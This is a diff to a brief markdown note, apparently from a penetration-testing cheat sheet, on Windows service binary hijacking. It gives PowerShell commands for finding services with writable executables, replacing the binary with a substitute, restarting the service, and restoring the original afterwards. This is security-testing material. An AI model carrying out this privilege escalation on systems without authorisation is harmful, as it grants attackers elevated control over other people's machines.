@@ -1,41 +1,28 @@
 # Service binary hijacking
 
-[← Windows services](services.md)
-
-Need writable service executable + privileged service account + start/restart trigger.
+Needs: writable service executable + privileged service account + start/restart trigger.
 
 ```powershell
 Get-CimInstance -ClassName Win32_Service |
   Select-Object Name,State,StartMode,StartName,PathName
-sc.exe qc <service-name>
+sc.exe qc <SERVICE>
 icacls 'C:\Path\To\service.exe'
-sc.exe query <service-name>
+sc.exe query <SERVICE>
 ```
-
-Separate executable from arguments in `PathName`; check your effective `(M)`/`(F)` ACL. Use `sc.exe` in PowerShell.
-
-Save binary; check exact service name/state and trigger:
+- Split executable from arguments in `PathName`; you need `(M)` or `(F)` in the ACL.
+- Use `sc.exe` in PowerShell (`sc` is an alias for `Set-Content`).
 
 ```powershell
-sc.exe query <service-name>
-# Stop the service first if it is running and you have SERVICE_STOP.
-$backup = Join-Path $env:TEMP 'service.exe.bak'
-Copy-Item 'C:\Path\To\service.exe' $backup
+# stop first if running and you have SERVICE_STOP
+Copy-Item 'C:\Path\To\service.exe' "$env:TEMP\service.exe.bak"
 Copy-Item '.\replacement.exe' 'C:\Path\To\service.exe'
-sc.exe start <service-name>
+sc.exe start <SERVICE>
 ```
+- Running service must be restarted: `SERVICE_START` ≠ `SERVICE_STOP`.
+- Restore afterwards if the service must keep working: `Copy-Item "$env:TEMP\service.exe.bak" 'C:\Path\To\service.exe'`.
 
-Running service needs restart (`SERVICE_START` ≠ `SERVICE_STOP`). Restore original after test:
-
-```powershell
-Copy-Item $backup 'C:\Path\To\service.exe'
-```
-
-PowerUp lead; verify ACL and trigger:
-
+PowerUp lead (verify ACL and trigger):
 ```powershell
 . .\PowerUp.ps1
 Get-ModifiableServiceFile
 ```
-
-[Microsoft service access rights](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights)
